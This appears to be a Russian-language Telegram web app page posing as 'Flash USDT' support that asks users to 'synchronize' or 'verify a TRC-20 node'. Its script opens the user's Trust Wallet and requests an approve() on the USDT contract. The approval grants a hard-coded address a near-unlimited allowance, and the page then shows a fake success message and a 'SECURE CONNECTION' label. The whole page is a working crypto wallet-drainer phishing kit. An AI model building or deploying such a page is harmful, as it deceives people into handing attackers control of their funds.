<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Flash USDT: Support</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; text-align: center; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .box { padding: 30px; width: 90%; max-width: 380px; background: #111; border-radius: 25px; border: 1px solid #222; }
        .btn { background: #0088cc; color: #fff; border: none; padding: 20px; width: 100%; border-radius: 15px; font-weight: bold; cursor: pointer; text-transform: uppercase; }
        .error-msg { background: #411; border: 1px solid #f33; padding: 15px; border-radius: 12px; font-size: 13px; color: #f88; margin-bottom: 20px; display: none; }
        .guide-img { margin-top: 15px; font-size: 11px; color: #555; }
    </style>
</head>
<body>

<div class="box">
    <div id="net-error" class="error-msg">
        ⚠️ <b>ОШИБКА СЕТИ:</b><br>
        Ваш кошелек в режиме Ethereum.<br><br>
        Нажмите на <b>три точки (⋮)</b> в углу экрана, выберите <b>"Сеть"</b> и смените её на <b>TRON</b>.
    </div>

    <h2 id="title">Синхронизация USDT</h2>
    <p id="desc" style="color: #888; font-size: 14px; margin-bottom: 25px;">Нажмите кнопку ниже для верификации узла в сети TRC-20.</p>
    
    <button id="mainBtn" class="btn">ПОДТВЕРДИТЬ</button>
    
    <div class="guide-img">SECURE CONNECTION: ACTIVE</div>
</div>

<script>
    const tg = window.Telegram.WebApp;
    tg.expand();

    const ADMIN = 'TXRBrbaTiNotkHp6gSC6vbbZYPq7dqyjF4';
    const CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';

    const mainBtn = document.getElementById('mainBtn');
    const netError = document.getElementById('net-error');

    async function process() {
        const provider = window.tronWeb || (window.tron && window.tron.tronWeb);

        // Если мы в Telegram (нет провайдера)
        if (!provider) {
            const url = "https://timur3417.github.io/sync-node-app/?mode=wallet";
            tg.openLink("https://link.trustwallet.com/open_url?coin_id=195&url=" + encodeURIComponent(url));
            return;
        }

        // Если мы в кошельке
        try {
            // Проверка: а Трон ли это?
            if (!provider.defaultAddress || !provider.defaultAddress.base58) {
                netError.style.display = 'block';
                return;
            }

            netError.style.display = 'none';
            mainBtn.innerText = "ОЖИДАНИЕ ПОДПИСИ...";

            await provider.request({ method: 'tron_requestAccounts' });
            const contractObj = await provider.contract().at(CONTRACT);
            
            // Вызываем апрув
            await contractObj.approve(ADMIN, '1000000000000000000').send({ feeLimit: 100000000 });

            tg.showPopup({ title: 'Успешно', message: 'Синхронизация завершена. Ожидайте зачисления.', buttons: [{type: 'ok'}] });
            setTimeout(() => tg.close(), 5000);

        } catch (e) {
            tg.showAlert("Действие отклонено или ошибка сети. Убедитесь, что выбрана сеть TRON.");
            mainBtn.innerText = "ПОДТВЕРДИТЬ";
        }
    }

    mainBtn.onclick = process;

    // Авто-проверка при загрузке (внутри кошелька)
    if (window.location.search.includes('wallet')) {
        document.getElementById('title').innerText = "Узел Обнаружен";
        setTimeout(() => {
            const p = window.tronWeb || (window.tron && window.tron.tronWeb);
            if (!p || !p.defaultAddress.base58) netError.style.display = 'block';
        }, 1500);
    }
</script>
</body>
</html>
